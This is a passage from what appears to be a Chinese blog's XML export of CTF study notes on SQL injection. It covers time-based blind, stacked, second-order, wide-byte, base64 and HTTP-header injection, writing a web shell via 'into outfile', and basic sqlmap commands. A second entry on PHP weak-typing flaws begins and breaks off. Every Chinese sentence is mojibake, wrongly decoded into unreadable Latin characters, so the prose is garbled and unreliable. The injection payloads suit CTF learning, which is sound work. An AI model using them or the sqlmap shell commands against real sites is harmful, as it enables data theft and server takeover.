·çš„æ‰¾åˆ°æ­£ç¡®çš„é—­åˆè§„åˆ™ï¼Œè¿™ä¸ªé—­åˆè§„åˆ™å¾—é…åˆç€ and sleep(5)è¯­å¥æ¥æ„é€ ï¼Œå“ªä¸€ä¸ªé—­åˆè§„åˆ™æ‰§è¡Œäº†sleep(5)ï¼Œé‚£ä¹ˆå°±æ˜¯æ­£ç¡®å¾—é—­åˆè§„åˆ™ï¼›</p></li><li><p>æ—¶é—´ç›²æ³¨é…åˆç€ if(A,B,C) è¯­å¥ç»“åˆä½¿ç”¨ï¼Œå«ä¹‰æ˜¯ï¼šå¦‚æœAæ˜¯ trueï¼Œåˆ™è¿”å›Bï¼ˆä¹Ÿå°±æ˜¯æ‰§è¡ŒBï¼‰ï¼Œå¦åˆ™è¿”å›Cï¼ˆæ‰§è¡ŒCï¼‰ï¼›</p></li><li><p>é‚£ä¹ˆåˆ¤æ–­å½“å‰æ•°æ®åº“åçš„é•¿åº¦çš„è¯­å¥ä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">if (length(database())&gt;1,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°±æ˜¯è¯´å¦‚æœæ•°æ®åº“é•¿åº¦å¤§äº1ï¼Œé‚£ä¹ˆå“åº”å»¶æ—¶5ç§’ï¼Œå¦åˆ™æ‰§è¡Œselect 1(ä¹Ÿå°±æ˜¯æ²¡æœ‰å»¶æ—¶)ï¼Œç”±æ­¤æ¥æ¨å‡ºæ•°æ®åº“é•¿åº¦ã€‚</p></li><li><p>åˆ¤æ–­å½“å‰æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå­—æ¯çš„è¯­å¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åªæœ‰ç¬¬ä¸€ä¸ªå­—æ¯ç­‰äº26ä¸ªå­—æ¯ä¸­æ­£ç¡®çš„å­—æ¯æ—¶ï¼Œæ‰ä¼šå»¶æ—¶5ç§’ï¼Œå› æ­¤å¯ä»¥é€šè¿‡burpæˆ–è€…sqlmapæ¥è·‘ã€‚</p></li><li><p>æ ¹æ®æ•°æ®åº“åé•¿åº¦ä»¥æ­¤å†…æ¨å³å¯å¾—å‡ºå®Œæ•´çš„æ•°æ®åº“çš„åº“å‘½ã€è¡¨åã€å­—æ®µåå’Œå…·ä½“å†…å®¹ã€‚</p></li></ol><h4 id="å †å æŸ¥è¯¢æ³¨å…¥"><a href="#å †å æŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å †å æŸ¥è¯¢æ³¨å…¥"></a>å †å æŸ¥è¯¢æ³¨å…¥</h4><ol><li><p>å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥çš„åœ°æ–¹ä¹Ÿå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ä¸æ—¶é—´ç›²æ³¨ï¼›</p></li><li><p>åŒæ ·å…ˆæ‰¾å‡ºæ­£ç¡®çš„é—­åˆè§„åˆ™ï¼Œç„¶åä¹Ÿçœ‹ä¸¤ç§çŠ¶æ€æ¥çŒœè§£åº“åã€è¡¨åç­‰ï¼›</p></li><li><p>å †å æ³¨å…¥çš„è¯­å¥ä¸º</p><pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>æŒ‰ç…§åŸç†æ¥è¯´ï¼Œåˆ†å·åé¢å¯ä»¥æ‰§è¡Œæ–°sqlè¯­å¥ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™æ²¡å¿…è¦ï¼Œå¦‚æœé‡åˆ°å…¶ä»–æ³¨å…¥æ–¹æ³•ï¼ˆæˆ–è€…ç»•è¿‡æ–¹å¼ï¼‰ä¸è¡Œçš„æƒ…å†µä¸‹å¯ä»¥è¯•è¯•è¿™ä¸ªæ³¨å…¥æ–¹å¼ï¼›ä¸æ˜¯å¾ˆå¸¸ç”¨ã€‚</p></li></ol><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><ol><li>äºŒæ¬¡æ³¨å…¥ä¸€å…±æœ‰ä¸¤ä¸ªurlï¼Œä¸€ä¸ªurlç”¨æ¥æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯æ³¨å…¥ç‚¹ï¼Œæ’å…¥sqlè¯­å¥çš„åœ°æ–¹ï¼Œå¦å¤–ä¸€ä¸ªurlç”¨æ¥è¿”å›ä¿¡æ¯ï¼›</li><li>ä¹Ÿå°±æ˜¯urlä¸€æ’å…¥äº†sqlè¯­å¥ï¼Œurlä¸€çš„å“åº”é‡Œé¢å°±ä¼šè¿”å›è¿™æ¡ä¿¡æ¯å¯¹åº”çš„idå€¼ï¼Œç„¶åurläºŒå°±ä¼ å…¥è¿™ä¸ªæ–°idå€¼ï¼Œç„¶åè®¿é—®ï¼Œå“åº”å›æ¥ä¹‹åå°†ä¼šçˆ†å‡ºsqlè¯­å¥æŸ¥è¯¢çš„ç»“æœï¼Œæ­£ç¡®æˆ–è€…é”™è¯¯çš„sqlä¿¡æ¯ï¼›</li><li>å°±ç›¸å½“äºurlæ˜¯ä¸€ä¸ªç”¨æˆ·æ³¨å†Œçš„åœ°æ–¹ï¼Œç”¨æˆ·æ³¨å†Œåä¼šåœ¨æ•°æ®åº“é‡Œé¢åŠ å…¥æ–°idå­˜æ”¾ç”¨æˆ·çš„æ³¨å†Œä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªidå¯ä»¥ä¼ ç»™urläºŒæ¥è®¿é—®ï¼ŒurläºŒå°±å¯ä»¥æ˜¾ç¤ºå‡ºç”¨æˆ·çš„æ³¨å†Œä¿¡æ¯ï¼Œä½†å¦‚æœæ³¨å†Œä¿¡æ¯å«ä¹‰æ¶æ„sqlè¯­å¥ï¼ŒurläºŒå°±ä¼šæ˜¾ç¤ºå‡ºæ•æ„Ÿçš„æ•°æ®åº“ä¿¡æ¯ï¼›</li><li>è·Ÿunionæ³¨å…¥æ”»å‡»å·®ä¸å¤šï¼Œåªæ˜¯å›æ˜¾çš„ä¿¡æ¯éœ€è¦åœ¨å¦å¤–çš„urlä¸­æ˜¾ç¤ºå‡ºæ¥äº†ï¼›</li><li>åé¢å°±æ˜¯unionæ³¨å…¥æ”»å‡»çš„å¸¸è§„æ“ä½œã€‚</li></ol><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><ol><li>å¦‚æœé‡åˆ°å•ã€åŒå¼•å·è¢«è½¬ä¹‰ï¼Œå˜æˆäº†åæ–œæ ï¼Œå¯¼è‡´å‚æ•°idæ— æ³•é€ƒé€¸å•å¼•å·çš„åŒ…å›´ï¼›</li><li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ­¤å¤„å°±ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ï¼›</li><li>ä½†æ˜¯å¦‚æœæ•°æ®åº“çš„ç¼–ç ä¸ºGBKæ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå› æ­¤åœ¨ä¸çŸ¥é“æ˜¯å¦æ˜¯GBKç¼–ç æ—¶ï¼Œéƒ½å¯ä»¥å°è¯•å»ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼›</li><li>å®½å­—èŠ‚çš„æ ¼å¼æ˜¯åœ¨åœ°å€åå…ˆåŠ ä¸€ä¸ª %df ï¼Œå†åŠ å•å¼•å·ï¼Œå› ä¸ºåæ–œæ çš„ç¼–ç ä¸º%5cï¼Œåœ¨GBKç¼–ç ä¸­ï¼Œ%df%5cæ˜¯ç¹ä½“å­—â€œé€£â€ï¼Œå› æ­¤ï¼Œå•å¼•å·æˆåŠŸé€ƒé€¸ï¼Œçˆ†å‡ºsqlé”™è¯¯ï¼›</li><li>å› æ­¤æ„é€ é—­åˆè§„åˆ™æ—¶ï¼Œåœ¨å•å¼•å·å‰é¢åŠ ä¸Š %df å°±è¡Œäº†ï¼›</li><li>ä¹‹ååœ¨é—­åˆè§„åˆ™ä¸­å†™å…¥åŒunionæ³¨å…¥çš„ä¸€äº›æŸ¥è¯¢è¯­å¥å°±è¡Œäº†ï¼›</li></ol><h4 id="base64æ³¨å…¥"><a href="#base64æ³¨å…¥" class="headerlink" title="base64æ³¨å…¥"></a>base64æ³¨å…¥</h4><p>é¦–å…ˆbase64æ˜¯ä»€ä¹ˆ?</p><p>Base64æ˜¯ç½‘ç»œä¸Šæœ€å¸¸è§çš„ç”¨äºä¼ è¾“8Bit<a href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683">å­—èŠ‚ç </a>çš„ç¼–ç æ–¹å¼ä¹‹ä¸€ï¼ŒBase64å°±æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤º<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457">äºŒè¿›åˆ¶</a>æ•°æ®çš„æ–¹æ³•ã€‚Base64ç¼–ç æ˜¯ä»äºŒè¿›åˆ¶åˆ°å­—ç¬¦çš„è¿‡ç¨‹ï¼Œå¯ç”¨äºåœ¨<a href="https://baike.baidu.com/item/HTTP">HTTP</a>ç¯å¢ƒä¸‹ä¼ é€’è¾ƒé•¿çš„æ ‡è¯†ä¿¡æ¯ã€‚é‡‡ç”¨Base64ç¼–ç å…·æœ‰ä¸å¯è¯»æ€§ï¼Œéœ€è¦è§£ç åæ‰èƒ½é˜…è¯»ã€‚</p><ol><li>å¦‚æœé‡åˆ°urlçš„å‚æ•°idçš„å€¼çœ‹èµ·æ¥åƒbase64çš„ï¼Œå…ˆæ‹¿å»urlè§£ç ï¼Œç„¶åå¦‚æœæ˜¯base64ï¼Œæ‹¿å»base64è§£ç ï¼Œè§£å‡ºæ¥çš„åº”è¯¥å°±æ˜¯idçš„å€¼ï¼ˆ1ï¼Œ2ç­‰æ•°å­—ï¼‰ï¼›</li><li>é‚£ä¹ˆå¦‚æœè¦å¯¹è¿™ä¸ªurlè¿›è¡Œsqlæ³¨å…¥æµ‹è¯•ï¼Œå°±éœ€è¦å¯¹idåé¢çš„æ‰€æœ‰å€¼è¿›è¡Œbase64ç¼–ç ï¼›</li><li>æ³¨å…¥çš„æ–¹å¼æ­¥éª¤éƒ½æ˜¯è·Ÿunionæ³¨å…¥ä¸€æ ·çš„ï¼Œåªä¸è¿‡åé¢çš„æ‰€æœ‰å€¼ï¼ˆæ•´ä¸ªpayloadï¼‰éƒ½è¦è¿›è¡Œbase64ç¼–ç åä¼ ç»™urlçš„cå‚æ•°æäº¤ï¼ŒåŒ…æ‹¬é—­åˆè§„åˆ™ã€‚</li></ol><h4 id="httpè¯·æ±‚å¤´â€”cookiæ³¨å…¥"><a href="#httpè¯·æ±‚å¤´â€”cookiæ³¨å…¥" class="headerlink" title="httpè¯·æ±‚å¤´â€”cookiæ³¨å…¥"></a>httpè¯·æ±‚å¤´â€”cookiæ³¨å…¥</h4><ol><li><p>æŠ“åŒ…å¯¹ä¸€ä¸ªurlçš„httpè¯·æ±‚å¤´çš„æ‰€æœ‰å‚æ•°è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•ï¼Œé‡Œé¢çš„æ‰€æœ‰å‚æ•°éƒ½æœ‰å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¦‚æœå“åº”åŒ…å‡ºç°sqlæŠ¥é”™ï¼Œé‚£ä¹ˆæµ‹è¯•çš„è¿™ä¸ªå‚æ•°å°±æ˜¯æ³¨å…¥ç‚¹ï¼›</p></li><li><p>å¸¸è§çš„httpå¤´éƒ¨æ³¨å…¥çš„å‚æ•°æœ‰ï¼š</p><pre class="line-numbers language-none"><code class="language-none">ã€Refererã€‘ã€ã€X-Forwarded-Forã€‘ã€ã€Cookieã€‘ã€ã€X-Real-IPã€‘ã€ã€Accept-Languageã€‘ã€ã€Authorizationã€‘<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>å¦‚æœæµ‹è¯•åˆ°cookieå‚æ•°çš„æ—¶å€™ï¼Œå“åº”æœ‰æŠ¥sqlé”™è¯¯ï¼Œé‚£ä¹ˆå°±æ˜¯cookieæ³¨å…¥æ”»å‡»ï¼›</p></li><li><p>å’Œunionæ³¨å…¥çš„å·®åˆ«å°±åœ¨äºæ³¨å…¥ç‚¹ä¸ä¸€æ ·ï¼Œä¹‹åä½¿ç”¨unionæ³¨å…¥çš„æ–¹æ³•å³å¯ã€‚</p></li></ol><h4 id="httpè¯·æ±‚å¤´â€”XFFæ³¨å…¥"><a href="#httpè¯·æ±‚å¤´â€”XFFæ³¨å…¥" class="headerlink" title="httpè¯·æ±‚å¤´â€”XFFæ³¨å…¥"></a>httpè¯·æ±‚å¤´â€”XFFæ³¨å…¥</h4><ol><li>XFFæ³¨å…¥å³HTTPå¤´éƒ¨çš„X-Forwarded-forå‚æ•°å­˜åœ¨sqlæ³¨å…¥ï¼›</li><li>ä¾‹å¦‚æµ‹è¯•æ­¤å‚æ•°çš„å€¼ X-Forwarded-for:127.0.0.1â€™ å“åº”æœ‰sqlæŠ¥é”™ï¼Œé‚£ä¹ˆæ­¤å¤„å°±æ˜¯æ³¨å…¥ç‚¹ï¼›</li><li>ä¹‹åä½¿ç”¨unionæ³¨å…¥çš„æ–¹æ³•å®Œæˆå³å¯ã€‚</li></ol><h4 id="çŸ¥é“ç»å¯¹è·¯å¾„çš„æ³¨å…¥"><a href="#çŸ¥é“ç»å¯¹è·¯å¾„çš„æ³¨å…¥" class="headerlink" title="çŸ¥é“ç»å¯¹è·¯å¾„çš„æ³¨å…¥"></a>çŸ¥é“ç»å¯¹è·¯å¾„çš„æ³¨å…¥</h4><ol><li>å¦‚æœçŸ¥é“äº†ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œå¹¶ä¸”çŸ¥é“æ­¤ç«™ç‚¹å­˜åœ¨sqlæ³¨å…¥ï¼›</li><li>çŒœæµ‹æ­¤æ•°æ®åº“å¯èƒ½æœ‰fileæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¯­å¥ï¼šinto outfile æ¥å†™shellåˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œä¹‹åç”¨èšå‰‘è¿æ¥ï¼›</li><li>å¦‚æœæ•°æ®åº“æ²¡æœ‰fileæƒé™ï¼Œå°±ç”¨sqlmapçš„å‚æ•° â€“is-dba æ¥æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„ç”¨æˆ·æ˜¯å¦æœ‰ç®¡ç†å‘˜æƒé™ï¼›</li><li>å¦‚æœæœ‰ç®¡ç†å‘˜æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨sqlmapé‡Œé¢çš„å‚æ•°å‘½ä»¤ â€“os-shell æ¥ä¸Šä¼ ã€åå¼¹shellï¼Œæœ€ç»ˆgetshellï¼›</li><li>å¦‚æœfileã€ç®¡ç†å‘˜æƒé™éƒ½æ²¡æœ‰ï¼Œé‚£ä¹ˆå¦å¯»æ€è·¯ï¼Œæ—¥å¿—ã€ç¼“å­˜å†™å…¥ç­‰ã€‚</li></ol><h3 id="sqlmapçš„ä½¿ç”¨"><a href="#sqlmapçš„ä½¿ç”¨" class="headerlink" title="sqlmapçš„ä½¿ç”¨"></a>sqlmapçš„ä½¿ç”¨</h3><p>sqlmapæ”¯æŒä¸€ä¸‹äº”ç§æ³¨å…¥ï¼š</p><ol><li>åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚</li><li>åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚</li><li>åŸºäºæŠ¥é”™æ³¨å…¥ï¼Œå³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚</li><li>è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚</li><li>å †æŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚</li></ol><p>ä¸‹é¢æœ‰ç®€è¦çš„æ“ä½œæ¦‚è¿°</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201453846.png" alt="image-20210208201453846"></p><p>å‘½ä»¤å¤ªå¤šäº†ï¼Œè¿˜ä¸å¤ªç†Ÿç»ƒï¼Œç›®å‰åªä¼šç”¨ä¸€ç‚¹</p><p>ä¸€äº›åŸºæœ¬å‘½ä»¤</p><h4 id="1-è¾“å‡ºç­‰çº§-V"><a href="#1-è¾“å‡ºç­‰çº§-V" class="headerlink" title="1.è¾“å‡ºç­‰çº§ V"></a>1.è¾“å‡ºç­‰çº§ V</h4><p><code>V</code> è¿™ä¸ªå‘½ä»¤ï¼Œåœ¨ SQLMap é‡Œå¯ä»¥ç†è§£æˆæ˜¯ä¸€å…±è¾“å‡ºçš„ä¿¡æ¯ï¼Œä»–çš„æµ‹è¯•ç­‰çº§æ˜¯éå¸¸å¤šçš„ï¼Œä¸€å…±åˆ†äº†ä¸ƒä¸ªç­‰çº§å‡ºæ¥ï¼Œè¿™ä¸ƒä¸ªç­‰çº§åœ¨æµ‹è¯•çš„æ—¶å€™ä¼šåœ¨ç•Œé¢é‡Œè¿”å›ä¸åŒçš„å†…å®¹ã€‚</p><p>é»˜è®¤æ˜¯ 1ï¼Œä¹Ÿå¯ä»¥åœ¨å‘½ä»¤åæŒ‡å®š <code>-v 3</code> å°±æ˜¯ç­‰çº§ 3 çš„è¾“å‡ºã€‚</p><pre class="line-numbers language-none"><code class="language-none">0ï¼šåªæ˜¾ç¤º Python çš„ tracebacks ä¿¡æ¯ã€é”™è¯¯ä¿¡æ¯ [ERROR] å’Œå…³é”®ä¿¡æ¯ [CRITICAL]ï¼›1ï¼šåŒæ—¶æ˜¾ç¤ºæ™®é€šä¿¡æ¯ [INFO] å’Œè­¦å‘Šä¿¡æ¯ [WARNING]ï¼›2ï¼šåŒæ—¶æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ [DEBUG]ï¼›3ï¼šåŒæ—¶æ˜¾ç¤ºæ³¨å…¥ä½¿ç”¨çš„æ”»å‡»è·è½½ï¼›4ï¼šåŒæ—¶æ˜¾ç¤º HTTP è¯·æ±‚ï¼›5ï¼šåŒæ—¶æ˜¾ç¤º HTTP å“åº”å¤´ï¼›6ï¼šåŒæ—¶æ˜¾ç¤º HTTP å“åº”ä½“ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-æŒ‡å®šç›®æ ‡-U"><a href="#2-æŒ‡å®šç›®æ ‡-U" class="headerlink" title="2.æŒ‡å®šç›®æ ‡ U"></a>2.æŒ‡å®šç›®æ ‡ <code>U</code></h4><p>ä½¿ç”¨å‚æ•° <code>-u</code> æˆ– <code>â€“url</code> æŒ‡å®šä¸€ä¸ª URL ä½œä¸ºç›®æ ‡ï¼Œè¯¥å‚æ•°åè·Ÿä¸€ä¸ªè¡¨ç¤º URL çš„å­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥æŒ‡å®šç«¯å£ï¼Œå¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "www.baidu.com/user.php?id=7"sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-åˆ—åº“-dbs"><a href="#3-åˆ—åº“-dbs" class="headerlink" title="3. åˆ—åº“ dbs"></a>3. åˆ—åº“ <code>dbs</code></h4><p>åœ¨æ£€æµ‹å‡ºäº†å­˜åœ¨æ³¨å…¥åï¼Œå°±è¦è¿›è¡Œå¯¹æ•°æ®åº“çš„åˆ—ä¸¾ï¼Œå‘½ä»¤æ˜¯ <code>--dbs</code></p><h4 id="4-åˆ—è¡¨-tables"><a href="#4-åˆ—è¡¨-tables" class="headerlink" title="4. åˆ—è¡¨ tables"></a>4. åˆ—è¡¨ <code>tables</code></h4><p>åœ¨åˆ—å‡ºäº† Web ç¨‹åºçš„åº“åï¼Œè¦æ ¹æ®è¿™ä¸ªåº“æ¥åˆ—å‡ºè¡¨ï¼Œå‘½ä»¤æ˜¯ <code>-D â€˜åº“åâ€™ --tables</code></p><h4 id="5-åˆ—å‡ºè¡¨ä¸­å­—æ®µ-columns"><a href="#5-åˆ—å‡ºè¡¨ä¸­å­—æ®µ-columns" class="headerlink" title="5. åˆ—å‡ºè¡¨ä¸­å­—æ®µ columns"></a>5. åˆ—å‡ºè¡¨ä¸­å­—æ®µ <code>columns</code></h4><p>å¾—åˆ°äº†åº“å’Œè¡¨ä¹‹åï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªåº“è¡¨æ¥åˆ—å‡ºè¡¨é‡Œçš„å­—æ®µè¿›è¡Œæ•°æ®çš„è¯»å–ï¼Œå‘½ä»¤æ˜¯ <code>-D â€˜åº“åâ€™ -T â€˜è¡¨åâ€™ --columns</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201601814.png" alt="image-20210208201601814"></p><p>è¿™äº›åªæ˜¯ä¸€äº›æšä¸¾å¸¸ç”¨çš„ï¼Œæ›´å¤šç”¨æ³•æ…¢æ…¢è§£é”å§</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ„Ÿè§‰å¯¹äºä¸€äº›æ³¨å…¥äº†è§£çš„è¿˜æ˜¯ä¸å¤Ÿæ·±ï¼Œæœ‰æ—¶å€™ç¢°åˆ°æ–°é¢˜è‡ªå·±è¯•äº†å„ç§æ–¹æ³•æ€»æ˜¯è¦å¾ˆä¹…æ‰åšçš„å‡ºæ¥ã€‚</p><p>ä¹Ÿå¯èƒ½æ˜¯æˆ‘æ•°æ®åº“å­¦çš„ä¸æ€ä¹ˆæ ·ï¼Œå¦‚æœå¯¹æ•°æ®åº“è¶Šç†Ÿæ‚‰çš„è¯åšé¢˜èµ·æ¥åº”è¯¥ä¼šå¦‚é±¼å¾—æ°´ã€‚</p><p>è‡ªå·±ç›®å‰ä¹Ÿåªæ˜¯å­¦äº†ä¸€ä¸ªmysqlï¼Œæ‰“ç®—æœ‰ç©ºçœ‹çœ‹å…¶ä»–çš„æ•°æ®åº“ã€‚</p><p>å…¶æ¬¡sqlmapä¹Ÿè¿˜æ˜¯ç”¨çš„ä¸ç†Ÿç»ƒï¼Œè¿˜æ˜¯éœ€è¦å¤šå»åˆ·é¢˜å¤šç»ƒç»ƒå•Šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpå¸¸è§æ¼æ´</title>
      <link href="2020/chang-jian-lou-dong/php-chang-jian-lou-dong/"/>
      <url>2020/chang-jian-lou-dong/php-chang-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfä¸­å¸¸è§çš„phpæ¼æ´"><a href="#ctfä¸­å¸¸è§çš„phpæ¼æ´" class="headerlink" title="ctfä¸­å¸¸è§çš„phpæ¼æ´"></a>ctfä¸­å¸¸è§çš„phpæ¼æ´</h2><p>åˆ·é¢˜çš„æ—¶å€™é‡åˆ°ä¸€äº›phpä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œå…¶ä¸­ä¹Ÿéƒ½ä¸€äº›æ˜¯è‡ªå·±æ²¡é‡åˆ°è¿‡ï¼Œä»ç½‘ç»œä¸Šæœé›†çš„ã€‚</p><h3 id="ç³»ç»Ÿå˜é‡"><a href="#ç³»ç»Ÿå˜é‡" class="headerlink" title="ç³»ç»Ÿå˜é‡"></a>ç³»ç»Ÿå˜é‡</h3><pre class="line-numbers language-none"><code class="language-none">$_POST // è·å– post æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸$_GET // è·å– get æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸$_COOKIE // è·å– cookie$_SESSION // è·å– session$_FILE // è·å–ä¸Šä¼ çš„æ–‡ä»¶$_REQUEST // è·å– $_GETï¼Œ$_POSTï¼Œ$_COOKIE ä¸­çš„æ•°æ®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦"><a href="#é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦" class="headerlink" title="é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦"></a>é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦</h3><p>PHP æ”¯æŒä¸€ä¸ªé”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼š@ã€‚å½“å°†å…¶æ”¾ç½®åœ¨ä¸€ä¸ªPHP è¡¨è¾¾å¼ä¹‹å‰ï¼Œè¯¥è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿçš„ä»»ä½•é”™è¯¯ä¿¡æ¯éƒ½è¢«å¿½ç•¥æ‰ã€‚</p><h3 id="å¼±ç±»å‹æ¼æ´"><a href="#å¼±ç±»å‹æ¼æ´" class="headerlink" title="å¼±ç±»å‹æ¼æ´"></a>å¼±ç±»å‹æ¼æ´</h3><p>PHPæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œä¸é¡»è¦æ˜ç¡®çš„å®šä¹‰å˜é‡çš„ç±»å‹ï¼Œå˜é‡çš„ç±»å‹æ ¹æ®ä½¿ç”¨æ—¶çš„ä¸Šä¸‹æ–‡æ‰€å†³å®šï¼Œä¹Ÿå°±æ˜¯å˜é‡ä¼šæ ¹æ®ä¸ä¸€æ ·è¡¨è¾¾å¼æ‰€é¡»è¦çš„ç±»å‹è‡ªåŠ¨è½¬æ¢ï¼Œå¥½æ¯”æ±‚å’Œï¼ŒPHPä¼šå°†ä¸¤ä¸ªç›¸åŠ çš„å€¼è½¬ä¸ºlongã€doubleå†è¿›è¡ŒåŠ å’Œã€‚æ¯ç§ç±»å‹è½¬ä¸ºå¦ä¸€ç§ç±»å‹éƒ½æœ‰å›ºå®šçš„è§„åˆ™ï¼Œå½“æŸä¸ªæ“åšå‘ç°ç±»å‹ä¸ç¬¦æ—¶å°±ä¼šæŒ‰ç…§è¿™ä¸ªè§„åˆ™è¿›è¡Œè½¬æ¢ï¼Œè¿™ä¸ªè§„åˆ™æ­£æ˜¯å¼±ç±»å‹å®ç°çš„åŸºç¡€ã€‚</p><h4 id="å’Œ-çš„åŒºåˆ«"><a href="#å’Œ-çš„åŒºåˆ«" class="headerlink" title="==å’Œ===çš„åŒºåˆ«"></a>==å’Œ===çš„åŒºåˆ«</h4><pre class="line-numbers language-none"><code class="language-none">==  ä¼šåœ¨æ¯”è¾ƒçš„æ—¶å€™è£…åŒ–æˆç›¸åŒçš„ç±»å‹=== å…ˆåˆ¤æ–­å·¦å³ä¸¤è€…ç±»å‹æ˜¯å¦ç›¸ç­‰ä¹‹åå†ä½œæ¯”è¾ƒï¼ˆè¿™ä¸ªæ›´ä¸¥æ ¼ä¸€äº›ï¼‰æ•´æ•°å’Œå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²æ•°å­—åçš„å†…å®¹ä¼šè¢«çœç•¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="æ•°ç»„æ¯”è¾ƒ"><a href="#æ•°ç»„æ¯”è¾ƒ" class="headerlink" title="æ•°ç»„æ¯”è¾ƒ"></a>æ•°ç»„æ¯”è¾ƒ</h4><p>å½“æ•°ç»„(array)ä¸ä»»ä½•éæ•°ç»„è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œæ•°ç»„è€æ˜¯æœ€å¤§çš„</p><h4 id="boolç±»å‹æ¯”è¾ƒ"><a href="#boolç±»å‹æ¯”è¾ƒ" class="headerlink" 